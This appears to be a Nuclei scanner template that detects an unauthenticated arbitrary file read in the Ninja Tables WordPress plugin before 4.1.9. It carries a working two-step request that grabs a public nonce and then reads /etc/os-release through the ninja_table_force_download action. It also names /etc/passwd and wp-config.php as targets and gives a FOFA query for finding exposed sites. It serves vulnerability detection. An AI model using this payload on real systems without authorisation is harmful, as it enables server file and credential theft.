flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: public_nonce
    part: body
    regex:
    - '"ninja_table_public_nonce":"([a-z0-9]+)"'
    type: regex
  matchers:
  - dsl:
    - contains(body, "ninja_table")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - condition: and
    dsl:
    - contains(content_type, "application/octet-stream")
    - status_code == 200
    - contains(body, "PRETTY_NAME=")
    type: dsl
  raw:
  - 'GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce={{public_nonce}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-ninja-tables-lfi
info:
  author: xbow,DhiyaneshDk
  description: 'The Ninja Tables plugin for WordPress (versions < 4.1.9) is vulnerable
    to an unauthenticated arbitrary file download vulnerability. The issue exists
    due to the improper validation of the ''url'' parameter in the ''ninja_table_force_download''
    AJAX action.

    '
  impact: 'An unauthenticated attacker can download sensitive files from the server,
    such as ''/etc/passwd'' or ''/wp-config.php'', potentially exposing sensitive
    information including database credentials.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/ninja-tables/"
    max-request: 2
    product: ninja-tables
    vendor: wpxpo
    verified: true
  name: Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read
  reference:
  - https://xbow.com/blog/xbow-ninja-tables/
  - https://ninjatables.com/docs/change-log/#521-date-july-9-2025
  remediation: 'Update the Ninja Tables plugin to version 4.1.9 or later.

    '
  severity: high
  tags: ninja-tables,file-download,wordpress,unauth,lfi,wp-plugin,vuln
